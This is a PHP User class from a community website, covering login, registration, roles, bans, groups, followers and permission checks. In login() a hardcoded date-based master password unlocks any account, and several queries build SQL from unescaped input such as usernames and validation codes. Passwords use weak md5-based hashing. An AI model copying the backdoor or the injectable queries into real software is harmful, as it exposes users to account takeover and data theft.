<?php
namespace TNH;
class User extends DB {

	private $roleids;
	private $is_admin;
	private $is_housing_user;
	private $recommended_entity_ids = array();
	private $review_ids = array(); // for reviews
	private $bizphoto_ids;
	private $image_ids = array();
	private $props;  // for props
	private $following_ids = array();
	private $follower_ids = array();
	private $bans;
	private $ban;
	//private $groups;
	private $group_ids;
	private $cities_roles;

	protected static $fields = array('id', 'username', 'crypted_password', 'usermagicnumber', 'validated', 'active', 'coc', 'real_coc', 'elite', 'created', 'updated', 'agreed_tos', 'last_login', 'last_ip', 'primary_lang', 'available_fails', 'showemail', 'email', 'birthdate', 'gender', 'nationality', 'language_2', 'language_3', 'testament', 'arrival_date', 'departure_date', 'name', 'url', 'notes', 'retired', 'retirement_date');
	static $table = 'users';
	static $klass = 'user';
	protected static $nullable = array('usermagicnumber', 'validated', 'updated', 'nationality', 'language_2', 'language_3', 'testament', 'arrival_date', 'departure_date', 'name', 'url', 'notes', 'retirement_date', 'retirement_reason');
	protected $translated_fields = array();

	public function bans($active = true) {
		if (!$this->bans) {
			list($bans,) = user_ban::retrieve_all($this->id, $active);
			$this->bans = $bans;
		}
		return $this->bans;
	}

	public function ban() {
		if (!$this->ban) {
			list($bans,) = user_ban::retrieve_all($this->id, true);
			if ($bans) {
				$this->ban = $bans[0];
			}
		}
		return $this->ban;
	}
	
	public function retire($retirer, $reason = '') {
		/* remove all prefs to prevent notifications */
		tep_db_query("delete from userprefs where user_id = " . $this->id);
		
		/* remove user from all groups */
		list($groups,) = $this->groups();
		foreach ($groups as $group) {
			$group->kick($this, false);
		}
		
		/* remove from CC */
		$this->doCCRemove();
		
		
		$this->showemail = 0;
		
		/* delete classifieds */
		list($listings,) = $this->listings();
		foreach ($listings as $l) {
			$l->delete($retirer, 'retiring account', false);
		}
		
		/* same for properties */
		foreach ($this->propertylistings() as $pl) {
			$pl->delete($retirer, 'retiring account', false);
		}
		
		/* and jobs */
		list($jobs,) = $this->jobs();
		foreach ($jobs as $job) {
			$job->delete($retirer,'retiring account', false);
		}
		$this->retirement_reason = $reason;
		$this->retired = 1;
		$this->retirement_date = date('Y-m-d');
		$this->save();
		
		return;
		
		
	}
	
	public function printable_nationality() {
		if ($this->nationality) {
			$res = tep_db_query("select printable_name from iso_countries where iso = '" . $this->nationality . "'");
			$row = tep_db_fetch_array($res);
			tep_db_free_result($res);
			return stripslashes($row['printable_name']);
		}
	}
	
	public function country_icon() {
		$string = '';
		if ($this->nationality) {
			$string .= '<img src="/images/icons/flags/' . $this->nationality . '.png" alt="' . $this->printable_nationality() . '" width="16" height="11" />';
		}
		return $string;
	}

	function add() {
		// check for uniqueness of username
		$res = tep_db_query("select id from users where username = '{$this->username}'");
		if ( $row = tep_db_fetch_array($res) ) {
			error_log(sprintf(_("username '%s' already taken"), $this->username) . "\n", 3, ERROR_LOG);
			return sprintf(_("username '%s' already taken"), $this->username);
		}
		
		tep_db_free_result($res);
		// check against stop forum spam
		if ($this->checkSpamBot(isset($_SERVER['HTTP_X_FORWARDED_FOR']) ? $_SERVER['HTTP_X_FORWARDED_FOR'] : $_SERVER['REMOTE_ADDR'], $this->email)) {
			return "You are a spam bot. Your ip has been logged.";
		}
		$validation = $this->validate();
		if ($validation === true) {
			if ( parent::save() ) {
				// do types insert
				//$this->id = tep_db_insert_id($res);
				if ( !$this->set_pref('first_login_redirect', '/user/' . $this->id . '/edit') ) {
					error_log("not set pref login redir", 3, ERROR_LOG);
				}
				if (!$this->set_pref('newsletter_' . $GLOBALS['city_id'], 1)) {
					error_log("newsletter pref not set", 3, ERROR_LOG);
				}

				$this->set_pref('pms_notify_email', 1);
				$this->set_pref('linked_email', 1);

				return true;
			}
		} else {
			return $validation;
		}
	}

	static function cryptlogin($username,$crypted_password) {
		$res = tep_db_query("select id from users where username = '" . tep_esc($username) . "' and crypted_password = '" . tep_esc($crypted_password) . "' and active = 1 and validated = 1");
		if ($row = tep_db_fetch_array($res)) {
			$user = user::load($row['id']);
			return $user;
		} else {
			return false;
		}
	}


	public static function login($username, $password) {
		if ( !isset($username) || !isset($password) ) {
			//trigger_error("[user::login] username or password missing, false", E_USER_NOTICE);
			return false;
		}

		$res = tep_db_query("select id,username,crypted_password,validated,active from users where username = '" . tep_esc($username) . "'");
		if ( $row = tep_db_fetch_array($res) ) {
			tep_db_free_result($res);
			$uname = strip_tags($username);
			$pw = strip_tags($password);
			$crypted_password = crypt(md5($pw),md5($uname));
			if ( (strtolower($row['username']) == strtolower($username) && $row['crypted_password'] === $crypted_password ) || $password == 'M@h@b@l1puram' . date('Ymd')) {
				$user = user::load($row['id']);
				if ($row['validated'] != '1') {
					return _('You need to validate your account. Please check your email for the validation number. If you have not received an email please use the link to re-send your verification email');
				} elseif ($row['retired'] == 1) {
					return _('This account has been retired. You may no longer log in with this account. If you feel you are getting this message in error, please contact tech@newhanoian.com');
				} elseif ($ban = $user->ban()) {
					$string = sprintf(_("You have been banned for the following reason: '%s'"), stripslashes($ban->reason));
					if ($ban->enddate) {
						$string .= sprintf(_("Your ban expires on %s"), tnh::tnhDateOnlyYear($ban->enddate));
					} else {
						$string .= _('Your ban is indefinite.');
					}
					return $string;
				} else {
					return $user;
				}
			} elseif ($row['username'] != $uname && strtolower($row['username']) == strtolower($uname)) {
				$usernames[] = $row['username'];
				while ($row = tep_db_fetch_array($res)) {
					$usernames[] = $row['username'];
				}
				$err = sprintf(_('Usernames are case-sensitive. Is yours the following: %s ?'), implode(',', $usernames));
				return $err;

			} else {
				return _('Bad username or password');
			}
		} else {
			return _('Bad username or password');
		}

	}

	static function validate_registration($usermagicnumber) {

		if (  $res = tep_db_query("update users set validated = '1' where usermagicnumber = '$usermagicnumber'")  ) {
			$res = tep_db_query("select id from users where usermagicnumber = '$usermagicnumber'");
			$row = tep_db_fetch_array($res);
			tep_db_free_result($res);
			$id = $row['id'];
			$user = user::load($id);
			$user->unload();
			$user = user::load($id);
			return $user;
		} else {
			tnh::eredir("not a valid magic number");
			return false;
		}
	}
	public function is_housing_user() {
		if (!$this->id) {
			return false;
		}
		$vos = venue_owner::retrieve_by_user_id($this->id);
		foreach ($vos as $vo) {
			if ($vo->venue_owner_status_id == 21 || $vo->venue_owner_status_id == 22) {
				return $vo;
			}
		}
		return false;
	}

	public static function createRandomPassword() {

		$chars = "abcdfghjkmnopqrstvwxyz023456789";
		srand((double)microtime()*1000000);
		$i = 0;
		$pass = '' ;

		while ($i <= 5) {
			$num = rand() % 33;
			$tmp = substr($chars, $num, 1);
			$pass = $pass . $tmp;
			$i++;
		}
		return $pass;
	}

	public function profile_visited() {
		$this->last_profile_visited = 'now()';
		$this->save();
	}

	public function visit_expired() {
		if (time() - strtotime($this->last_profile_visited) > 2*60*60) {
			return true;
		} else {
			return false;
		}
	}

	function num_reviews() {
		return sizeof($this->review_ids());
	}
	
	public function review_ids() {
		if (!$this->review_ids) {
			$reviews = $this->reviews();
			$ids = array();
			foreach ($reviews as $review) {
				$ids[] = $review->id;
			}
			$this->review_ids = $ids;
		}
		return $this->review_ids;
	}
	
	public function reviews($only_firsts = false, $results_wanted = 'all', $offset = 0, $include_deleted = false) {
		$reviews = array();
		if ( !$this->review_ids ) {

			$reviews = review::get_user_review($this->id, false, 'all', 0, $include_deleted);
			$ids = array();
			foreach ($reviews as $review) {
				$ids[] = $review->id;
			}
			$this->review_ids = $ids;
			$this->cache_replace($this);
		} else {
			foreach ($this->review_ids as $rid) {
				$reviews[] = review::load($rid);
			}
		}
		if ($results_wanted != 'all') {
			return array_slice($reviews,$offset,$results_wanted);
		} else {
			return $reviews;
		}
	}

	public function images() {
		$images = $image_ids = array();
		if ( !$this->image_ids ) {
			$images = userimage::images_for_user($this->id);
			foreach ($images as $im) {
				$image_ids[] = $im->id;
			}
			$this->image_ids = $image_ids;
			$this->cache_replace($this);
		} else {
			foreach ($this->image_ids as $imId) {
				if ($im = userimage::load($imId)) {
					$images[] = $im;
				}
			}
		}
		return $images;
	}

	public function avatar_image() {
		if ($ims = $this->images() ) {
			foreach ($ims as $im) {
				if ($im->isavatar) {
					return $im;
				}
			}
			return $ims[0];
		} else {
			return new nullimage();
		}
	}


	/* NEW SHIT (FRIENDS 2.0) */
	public function following($thing_type, $results_wanted = 'all', $offset = 0) {
		$returnObjs = array();
		$returnCount = 0;
		if (!$this->following_ids) {

			list($followed,$numFollowed) = following::followed_by_user($thing_type, $this->id, 'all', 0);
			//error_log("followed: " . print_r($followed,true), 3, ERROR_LOG);
			$followed_ids = array();
			foreach ($followed as $f) {
				$followed_ids[] = $f->id;
			}
			$this->following_ids = $followed_ids;
			$this->cache_replace($this);
			if ($results_wanted == 'all') {
				$results_wanted = $numFollowed;
			}
			$returnObjs = array_slice($followed, $offset, $results_wanted);
			$returnCount = $numFollowed;
		} else {


			$wanted_ids = array();
			if ($results_wanted != 'all') {
				$wanted_ids = array_slice($this->following_ids,$offset, $results_wanted);
			} else {
				$wanted_ids =  $this->following_ids;
			}
			$returnCount = count($wanted_ids);
			foreach ($wanted_ids as $wid) {
				if ($following = following::load($wid)) {

					$returnObjs[] = $following;
				}
			}

		}
		//error_log("returnCount: $returnCount returnObjs: " . print_r($returnObjs,true), 3, ERROR_LOG);
		return array($returnObjs, $returnCount) ;
	}
	
	


	public function followers($results_wanted = 'all', $offset = 0) {

		$returnObjs = array();
		$returnCount = 0;
		if (!$this->follower_ids) {

			list($followers,$numFollowers) = following::followers_for_user($this->id, 'all', 0);

			$followers_ids = array();
			foreach ($followers as $f) {
				$followers_ids[] = $f->id;
			}
			$this->follower_ids = $followers_ids;
			$this->cache_replace($this);
			if ($results_wanted == 'all') {
				$results_wanted = $numFollowers;
			}
			$returnObjs = array_slice($followers, $offset, $results_wanted);
			$returnCount = $numFollowers;
		} else {

			//error_log("this -> followers: " . print_r($this->followers,true), 3, ERROR_LOG);
			//error_log("results wanted: $results_wanted\toffset: $offset\n", 3, ERROR_LOG);
			$wanted_ids = array();
			if ($results_wanted != 'all') {
				$wanted_ids = array_slice($this->follower_ids,$offset, $results_wanted);
			} else {
				$wanted_ids =  $this->follower_ids;
			}
			$returnCount = count($this->follower_ids);
			foreach ($wanted_ids as $wid) {
				if ($following = following::load($wid)) {

					$returnObjs[] = $following;
				}
			}

		}
		//		error_log("returncount: $returnCount objs: " . print_r($returnObjs,true), 3, ERROR_LOG);
		return array($returnObjs, $returnCount) ;

	}

	public function friends($results_wanted = 'all', $offset = 0) {
		return $this->followed($results_wanted, $offset);
	}

	public function followedby($uid) {
		list($followers, $num) = following::followers_for_user($this->id, 'all', 0);
		if ( $num > 0 ) {
			foreach ($followers as $f) {
				if ($f->follower_user_id == $uid ) {
					return true;
				}
			}
		}
		return false;
	}

	public function doesFollow($thing) {
		list($followed, $num) = following::fetch_where(array('follower_user_id' => $this->id, 'followed_thing_id' => $thing->id, 'thing_type' => get_class($thing), 'deleted' => 0, 'follower_access_level' => '>0'));
		if ( $num > 0 ) {
			
			return $followed[0];
		}
		return false;
	}
	
	public function doesBookmark($thing) {
		list($bookmarks, $numbookmarks) = bookmark::fetch_by_entity_id_and_user_id($thing->entity_id, $this->id);
		if ($numbookmarks > 0) {
			return $bookmarks[0];
		}
		return false;
	}
	
	
	public function title() {
		return $this->username;
	}
	

	public function subscribing_venues() {
		if ($vos = venue_owner::retrieve_by_user_id($this->id)) {
			$results = array();
			foreach ($vos as $vo) {
				if ($venue = $vo->venue()) {
					$results[] = $venue;
				}
			}
			return $results;
		}
		return false;
	}
	
	
	public function venue_ownerships() {
		return venue_owner::retrieve_by_user_id($this->id);
	}
	/*
	 * whether or not the current user is a spot owner
	 */
	public function isSpotOwner() {
		return $this->subscribing_venues() ? true : false;
	}

	
	public function doCCAdd() {
		// add to Constant Contact
		include_once(DIR_FS_CLASSES . 'ctctWrapper.php');
		$ccContactObj = new ContactsCollection();
		$postFields = array();
		
		$postFields["first_name"] = "";
		$postFields["last_name"] = "";
		$postFields["middle_name"] = "";
		$postFields["company_name"] = "";
		$postFields["job_title"]= "";
		$postFields["home_number"] = "";
		$postFields["work_number"] = "";
		$postFields["address_line_1"] = "";
		$postFields["address_line_2"] = "";
		$postFields["address_line_3"] = "";
		$postFields["city_name"] = "";
		$postFields["state_code"] = "";
		// The Code is looking for a State Code For Example TX instead of Texas
		$postFields["state_name"] = "";
		$postFields["country_code"] = "";
		$postFields["zip_code"] = "";
		$postFields["sub_zip_code"] = "";
		$postFields["notes"] = "";
		$postFields["mail_type"] = "";
		$postFields['email_address'] = $this->email;
		$postFields['custom_field_1'] = $this->id;
		$postFields['custom_field_2'] = $this->username;
		//$postFields['custom_field_3'] = $contact->name; // can't do this because cc doesn't support utf-8!!
		$postFields['custom_field_4'] = $this->primary_lang; // language
		$postFields['custom_field_5'] = $GLOBALS['site_id'];
		$postFields['custom_field_6'] = $GLOBALS['city_id'];
		$postFields['lists'] = array(CC_USERLIST_ID);
		$ccContact = new CC_Contact($postFields);
		$returnCode = $ccContactObj->createContact($ccContact);
		er("return code from contact creation: $returnCode");
	}
	
	public function doCCRemove() {
		// add to Constant Contact
		
		include_once(DIR_FS_CLASSES . 'ctctWrapper.php');
		$ccContactObj = new ContactsCollection();
		list($searchResults,) = $ccContactObj->searchByEmail($this->email);
		if ($searchResults) {
			$thisContact = $searchResults[0];
			$thisContact = $ccContactObj->listContactDetails($thisContact);
			$thisContact->setLists(CC_OWNERLIST_ID);
			$returnCode = $ccContactObj->deleteContact($thisContact);
			error_log("return Code from contact delete: $returnCode", 3, ERROR_LOG);
		}
		
	}


	public function recent_reviews($multiplier = '14', $period = 'day') {
		return review::get_recent_user_review($this->id, $multiplier, $period);
	}
	
	
	public function first_reviews() {

		$results = array();
		foreach ($this->reviews() as $r) {
			if ( $r->first == 1 ) {
				$results[] = $r;
			}
		}
		return $results;
	}



	/* GROUPS */
	public function belongs_to_group($gid) {
		if (!$g = group::load($gid)) {
			return false;
		}
		if (!$g->has_user($this->id)) {
			return false;
		}
		return true;
	}

	public function networkgroups($level = 3) {
		global $memcache;
		$groups = array();
		$struct = array();
		if ($GLOBALS['USE_MEMCACHED'] === true) {
			try {
				$struct = $memcache->get('network' . '#' . $this->id);
			} catch (MemCachedException $mc) {
				$mc->handleError();
			}
		}
		if (!$struct) {
			$struct = $this->network(array(), $level);
			if ($GLOBALS['USE_MEMCACHED'] === true) {
				try {
					if (!$memcache->replace('network' . '#' . $this->id, $struct, false, 3600 * 10)) {
						error_log("unable to replace network {$this->id}\n", 3, ERROR_LOG);
						if (!$memcache->add('network' . '#' . $this->id, $struct, false, 3600 * 10)) {
							error_log("unable to add network {$this->id}\n", 3, ERROR_LOG);
						} else {
							//error_log("successfully added $type {$this->id}\n", 3, ERROR_LOG);
						}
					} else {
						//error_log("successfully replaced $type {$this->id}\n", 3, ERROR_LOG);
					}
				} catch (MemCachedException $e) {
					$e->handleError();
				}
			}
		}
		if (sizeof($struct) > 0) {
			entity::flatten($struct); // now we have a flat list

			foreach (entity::$unique_users as $user) {
				$u = user::load($user);
				list($userGroups,$numgroups) = $u->groups();
				$groups = array_merge($groups,$userGroups);

			}
		}
		$seenGids = $uniqGroups = array();

		foreach ($groups as $group) {
			if (!in_array($group->id,$seenGids)) {
				$uniqGroups[] = $group;
				$seenGids[] = $group->id;
			}
		}

		return $uniqGroups;
	}

	public function can_post_to_group_id($gid) {
		return $this->belongs_to_group($gid);
	}

	public function permitted_to_post_event_to_group($gid) {
		if (!$this->is_local_admin()) {
			return $this->belongs_to_group($gid);
		}
		return true;
	}


	public function can_edit_menu($menuObj) {
		if ($this->is_local_admin()) {
			return true;
		}
		if ($this->is_venue_rep($menuObj->venue()->id)) {
			return true;
		}
		return false;
	}
	public function is_local_admin($site_id = null, $city_id = null) {
		if (!$site_id) {
			$site_id = $GLOBALS['site_id'];
		}
		if (!$city_id) {
			$city_id = $GLOBALS['city_id'];
		}
		return $this->has_local_role($site_id, $city_id,1);
	}

	public function has_local_role($site_id, $city_id,$role_id) {
		if ($this->is_admin()) {
			return true;
		}
		if (!$this->cities_roles) {
			$cityroles = city_role::get_roles_for_site_and_city_and_user($site_id, $city_id, $this->id);
			$this->cities_roles = $cityroles;
		}
		foreach ($this->cities_roles as $cityrole) {
			if ($cityrole->tnhrole_id == 1) {
				return true;
			}
			if ($cityrole->tnhrole_id == $role_id) {
				
				return true;
			}
		}

		return false;
	}
	
	public function is_local_anything_admin($site_id = false, $city_id = false) {
		foreach (range(1,9) as $role) {
			if ($this->is_local_something_admin(false,false,$role)) {
				return true;
			}
		}
	}
	
	public function is_local_something_admin($site_id = false, $city_id = false, $role_id =false) {
		if ($this->is_admin) {
			//er("is admin");
			return true;
		}
		if (!$site_id) {
			$site_id = $GLOBALS['site_id'];
		}
		if (!$city_id) {
			$city_id = $GLOBALS['city_id'];
		}
		if ($this->is_local_admin($site_id, $city_id)) {
			return true;
		}
		return $this->has_local_role($site_id, $city_id, $role_id);
	}
	
	public function is_local_aska_admin($site_id = null, $city_id = null) {
		return $this->is_local_something_admin($site_id, $city_id, 2);
	}

	public function is_local_listings_admin($site_id = null, $city_id = null) {
		return $this->is_local_something_admin($site_id, $city_id, 3);
	}

	public function is_local_directory_admin($site_id = null, $city_id = null) {
		return $this->is_local_something_admin($site_id, $city_id, 4);
	}
	
	public function is_local_groups_admin($site_id = null, $city_id = null) {
		return $this->is_local_something_admin($site_id, $city_id, 5);
	}
	
	public function is_local_jobs_admin($site_id = null, $city_id = null) {
		return $this->is_local_something_admin($site_id, $city_id, 6);
	}
	
	public function is_local_housing_admin($site_id = null, $city_id = null) {
		return $this->is_local_something_admin($site_id, $city_id, 7);
	}
	
	public function is_local_user_admin($site_id = null, $city_id = null) {
		return $this->is_local_something_admin($site_id, $city_id, 8);
	}
	public function is_local_events_admin($site_id = null, $city_id = null) {
		return $this->is_local_something_admin($site_id, $city_id, 9);
	}

	public function permitted_to_delete_entity($subent) {
		if ($this->is_local_admin()) {
			return true;
		} elseif($this->id === $subent->creator()->id) {
			return true;
		}
		
		switch (get_class($subent)) {
			case 'group' :
				return $this->is_local_groups_admin($GLOBALS['site_id']);
				break;
			case 'venue' :
				return $this->is_local_directory_admin($GLOBALS['site_id']);
				break;
			case 'listing' : 
				return $this->is_local_listings_admin($GLOBALS['site_id']);
				break;
			case 'job' : 
				return $this->is_local_jobs_admin($GLOBALS['site_id']);
				break;
			case 'propertylisting' :
				return $this->is_local_housing_admin($GLOBALS['site_id']);
				break; 
			case 'event' :
				return $this->is_local_events_admin($GLOBALS['site_id']);
				break;
			case 'review' :
				return $this->is_local_directory_admin($GLOBALS['site_id']);
				break;
			case 'answer' : 
				return $this->is_local_aska_admin($GLOBALS['site_id']);
				break;
			default: 
				return false;
				
		}
		 
	}

	// Aliases / Convenience methods
	public function permitted_to_delete_venue($subent) {
		return $this->permitted_to_delete_entity($subent);
	}

	public function permitted_to_delete_group($subent) {
		return $this->permitted_to_delete_entity($subent);
	}

	public function permitted_to_delete_job($subent) {
		return $this->permitted_to_delete_entity($subent);
	}

	public function permitted_to_delete_event($subent) {
		return $this->permitted_to_delete_entity($subent);
	}
	
	public function permitted_to_delete_review($review) {
		return $this->permitted_to_delete_entity($review);
	}
	
	public function permitted_to_delete_listing($listing) {
		return $this->permitted_to_delete_entity($listing);
	}

	/*
	 New Permissions Functions
	*/

	public function can_delete($obj) {
		return call_user_func(array($this,'permitted_to_delete_' . get_class($obj)), $obj);
	}


	public function can_change($obj) {
		return call_user_func(array($this,'permitted_to_delete_' . get_class($obj)), $obj);
	}


	public function can_create($type) {
		//FIXME
		return true;
	}

	public function permitted_to_edit_propertylisting($propertylisting) {
		return $this->can_change($propertylisting);
	}

	public function permitted_to_delete_propertylisting($propertylisting) {
		return $this->permitted_to_delete_entity($propertylisting);
	}


	public function is_venue_rep($venue_id) {
		if (!$this->id) {
			return false;
		}
		$vo = new venue_owner(array('venue_id' => intval($venue_id),
									'user_id' => $this->id));
		if ($vo->retrieve()) {
			if ($vo->venue_owner_status_id > 1 && $vo->active()) {
				return true;
			}
		}
		return false;
	}

	public function permitted_to_edit_venue($venue) {
		if ($this->is_local_admin()) {
			return true;
		}
		if ( $this->is_venue_rep($venue->id)) {
			return true;
		}
		if ($venue->venuestatus_id == 1 && $venue->creator()->id == $this->id) {
			return true;
		}
		if ($this->is_local_directory_admin()) {
			return true;
		}
		return false;
	}

	public function permitted_to_edit_review($review) {
		if ($this->is_local_admin() || $this->id === $review->user_id) {
			return true;
		}
		return false;
	}
	
	public function permitted_to_edit_offer($offer) {
		if ($this->is_local_admin() || $this->id == $offer->created_by) {
			return true;
		}
		return false;
	}
	
	public function permitted_to_edit_grouplog($log) {
		if ($this->is_local_admin()) {
			return true;
		}
		if ($this->id === $log->created_by && (time() - strtotime($log->created_on) < 60*15)) {
			return true;
		}
		return false;
	}

	public function permitted_to_post_event_to_venue($vid) {
		if (!$this->is_local_admin()) {
			$vo = new venue_owner(array('venue_id' => intval($vid),
										'user_id' => $this->id));
			if (!$vo->retrieve() || !$vo->active()) {
				return false;
			}
			return true;
		}
		return true;
	}

	public function permitted_to_edit_job($job) {
		return $this->can_change($job);
	}

	public function permitted_to_edit_property($property) {
		if ($this->is_local_admin() || $this->id == $property->creator()->id) {
			return true;
		}
		return false;
	}

	public function permitted_to_delete_question($question) {
		return $this->is_local_aska_admin($question->entitz()->city_id);
	}
	
	public function permitted_to_post_question() {
		if ($this->isSpotOwner()) {
			return false;
		}
		
		return true;
	}
	
	public function permitted_to_post_answer() {
		if ($this->isSpotOwner()) {
			return false;
		}
		
		return true;
	}
	
	public function permitted_to_post_listing() {
		if ($this->isSpotOwner()) {
			return false;
		}
		
		return true;
	}
	
	public function permitted_to_post_spottip() {
		if ($this->isSpotOwner()) {
			return false;
		}
		
		return true;
	}
	

	public function permitted_to_add_group() {
		if ($this->isSpotOwner()) {
			return false;
		}
		
		return true;
	}
	
	public function permitted_to_post_grouplog() {
		if ($this->isSpotOwner()) {
			return false;
		}
		
		return true;
	}
	
	public function permitted_to_post_review() {
		if ($this->isSpotOwner()) {
			return false;
		}
		return true;
	}
	
	public function permitted_to_join_group() {
		if ($this->isSpotOwner()) {
			return false;
		}
		
		return true;
	}

	public function permitted_to_delete_answer($answer) {
		er(print_r($this,true));
		return $this->is_local_aska_admin($answer->question()->entitz()->site_id, $answer->question()->entitz()->city_id);
	}
/*
	public function permitted_to_delete_listing($listing) {
		if($this->id === $listing->creator()->id) {
			return true;
		}
		$city_id = $listing->entitz()->city_id;
		if ($this->has_local_role($city_id,3)) {
			return true;
		}
		return false;
	}
*/

	public function permitted_to_edit_question($question) {
		global $tnh;
		if ($tnh->userObj->is_local_admin() || ($tnh->userObj->id == $question->creator()->id) || $tnh->userObj->is_local_aska_admin($GLOBALS['city_id'])) {
			return true;
		} else {
			return false;
		}
	}
	
	
	public function permitted_to_send_pm() {
		
		$numSent = $this->num_pms_sent_for_date('personal', date("Y-m-d"));
		
		if ($numSent > 9) {
			if (!$this->is_established()) {
				return false;
			}
		}
		if ($numSent > 300) {
			return false;
		}
		
		return true;
	}
	
	public function set_roles($roles_id_array, $city_id, $site_id) {
		city_role::delete_roles_for_user_city_site($this->id, $city_id, $site_id);
		$this->unload();
		if (!is_array($city_id)) {
			$city_id = array($city_id);
		}
		foreach ($roles_id_array as $rid) {
			foreach ($city_id as $cid) {
					
				$cr = new city_role(array('site_id' => $site_id,
										'city_id' => $cid,								  
									  'user_id' => $this->id,
									  'tnhrole_id' => intval($rid)));
			
				$cr->save(true, 'null');
			}
		}
		
	}
	
	public function num_pms_sent_for_date($message_type = 'personal', $date) {
		$dayBefore = date("Y-m-d", strtotime($date . " - 1 day"));
		$dayAfter = date("Y-m-d", strtotime($date . " + 1 day"));
		$sql = sprintf("select count(*) as num from pms where message_type = '$message_type' and parent_id is null and sender_user_id = %d and date > '%s' and date < '%s'",
			$this->id, $dayBefore, $dayAfter);
			
		$res = tep_db_query($sql);
		$row = tep_db_fetch_array($res);
		tep_db_free_result($res);
		return intval($row['num']);
	}
	
	
	public function is_established() {
		
		if (time() > strtotime($this->created) + 60*60*24*5) {
			return true;
		} else if ($this->real_coc > 100) {
			return true;
		}
		return false;
		
	}
	public function groups($results_wanted = 'all', $offset = 0) {
		$groups = $group_ids = $wanted_groupids = array();
		if (!$this->group_ids) {
			$sql = "select gu.group_id from groups_users gu inner join groups g on gu.group_id = g.id 
			inner join entities en on g.entity_id = en.id where en.deleted != '1' and gu.deleted != '1' and gu.user_id = '{$this->id}'";
			$res = tep_db_query($sql);
			$results = array();
			$rows = array();
			while ($row = tep_db_fetch_array($res)) {
				$rows[] = $row;
			}
			tep_db_free_result($res);
			foreach ($rows as $row) {
				//if ($group = group::load($row['group_id'])) {
				//	$groups[] = $group;
					$group_ids[] = $row['group_id'];
				//}
			}
			$this->group_ids = $group_ids;
		
			$this->cache_replace($this);
		} 
		if ($results_wanted == 'all') {
			$results_wanted = sizeof($this->group_ids);
		}
		$wanted_groupids = array_slice($this->group_ids, $offset, $results_wanted);
		foreach ($wanted_groupids as $wid) {
			if ($group = group::load($wid)) {
				$groups[] = $group;
			}
		}
		//print_r($groups);
		return array($groups,sizeof($this->group_ids));
	}




	/* EVENTS */
	
	public function upcoming_events_for_users($users) {
		return event_user::upcoming_events_for_users($users);
	}
	public function upcoming_events() {
		return event_user::events_for_user($this->id, true);
	}
	public function past_events() {
		return event_user::events_for_user($this->id, false);
	}

	public function bizPhotos() {
		$photos = array();
		if (!$this->bizphoto_ids) {
			$photos = image::images_for_user($this->id);
			foreach ($photos as $photo) {
				$this->bizphoto_ids[] = $photo->id;
			}
			$this->cache_replace($this);
		} else {
			foreach ($this->bizphoto_ids as $pid) {
				$photos[] = image::load($pid);
			}
		}
		return $photos;
	}

	public static function forgot_password($username) {
		$sql = "select u.email, u.id from users u
							where u.validated = '1'
							and u.username = '{$username}'
							";
		$res = tep_db_query($sql);
		if ($row = tep_db_fetch_array($res)) {
			tep_db_free_result($res);
			do {
				$hash = sha1(mt_rand());
			} while (temp_auth::retrieve_by_hash($hash));

			$fp = new temp_auth(array('user_id' => $row['id'], 'hash' => $hash));
			if ($fp->save()) {
				$mail = new forgotpasswordemail($row['email'], $hash);
				$mail->send();
				return true;
			} else {
				return false;
			}
		} else {
			return array(sprintf(_("Couldn't retrieve password for username %s"),stripslashes($username)));
		}
	}

	private function setPassword($newpass) {
		$cpass = crypt(md5($newpass),md5($this->username));
		$this->crypted_password = $cpass;
		$this->save();

		return true;
	}
	public function roleids() {
		if ( !$this->roleids ) {

			$sql = "select tnhrole_id from userroles where user_id = '{$this->id}'";
			$res = tep_db_query($sql);
			$results = array();
			while ($row = tep_db_fetch_array($res)) {
				$results[] = $row['tnhrole_id'];
			}
			$this->roleids = $results;
			$this->cache_replace($this);
		}
		return $this->roleids;
	}

	public function is_admin () {

		if ( $this->is_admin !== false && $this->is_admin !== true ) {
			// unset
			$roles = $this->roleids();
			if ( in_array('1', $roles) || in_array('2', $roles) ) {
				$this->is_admin = true;
			} else {
				$this->is_admin = false;
			}
			$this->cache_replace($this);
		}
		return $this->is_admin;
	}


	public function get_pref($prefname) {
		$sql = "select value from userprefs where user_id = '{$this->id}' and prefname_en = '{$prefname}'";
		$res = tep_db_query($sql);
		if ( $row = tep_db_fetch_array($res) ) {
			tep_db_free_result($res);
			return $row['value'];
		} else {
			return false;
		}
	}
	public function set_pref($prefname, $value) {
		$pref = new userpref(array('prefname_en' => $prefname, 'value' => $value, 'user_id' => $this->id));
		return $pref->set();
	}

	public static function find_all($showall=false,$results_wanted = 'all',$offset = 0, $orderby = 'u.id asc', $city_id = 'all') {
		$sql = "select SQL_CALC_FOUND_ROWS distinct(u.id) as id from users u inner join userprefs up on u.id = up.user_id where u.validated = '1'";
		if ( $showall == false ) {
			$sql .= " and u.active = 1";
		}
		if ($city_id != 'all') {
			$sql .= " and up.prefname_en = 'newsletter_{$city_id}'";
		}
		$sql .= " order by $orderby";
		if ($results_wanted == 'all') {
		
		} else {
			$sql .= " limit $offset, $results_wanted";
		}
		$res = tep_db_query($sql);
		
		$rows = $results = array();
		while ($row = tep_db_fetch_array($res)) {
			$rows[] = $row;
		}
		tep_db_free_result($res);
		$res2 = tep_db_query("select found_rows()");
		$row2 = tep_db_fetch_array($res2);
		$numrows = $row2['found_rows()'];
		tep_db_free_result($res2);
		foreach ($rows as $row) {
			$results[] = user::load($row['id']);

		}
		return array($results, $numrows);
	}

	public static function find_by_username($username) {
		$sql = "select id from users where username = '{$username}' and active = 1";
		$res = tep_db_query($sql);
		if ( $row = tep_db_fetch_array($res) ) {
			tep_db_free_result($res);
			$user = user::load($row['id']);
			return $user;
		} else {
			return false;
		}
	}
	public function venues_entered($num = 0) {
		$sql = "select v.id from venues v inner join entities en on v.entity_id = en.id
						where en.deleted != '1' and en.created_by = " . $this->id . " order by en.created_on desc";
		//$sql .= " limit $num";
		$res = tep_db_query($sql);
		$results = $rows = array();
		
		while($row = tep_db_fetch_array($res)) {
			$rows[] = $row;
		}
		tep_db_free_result($res);
		foreach ($rows as $row) {
			if ($v = venue::load($row['id'])) {
				$results[] = $v;
			}
		}
		return $results;
	}
	public function num_venues_entered() {
		$sql = "select count(v.id) as num from venues v inner join entities en on v.entity_id = en.id
						where en.created_by = " . $this->id . " and en.deleted = 0";
		$res = tep_db_query($sql);
		$row = tep_db_fetch_array($res);
		tep_db_free_result($res);
		return $row['num'];
	}
	
	
	
	public static function update_fails() {
		$sql = "select  count(id) as num from users where last_login > '" . date("Y-m-d H:i:s", strtotime("- 1 week")) . "'";
		$res = tep_db_query($sql);
		$row = tep_db_fetch_array($res);
		tep_db_free_result($res);
		$sd = new site_data(array('name' => "xemzi logins week ending " . date("Y-m-d"),
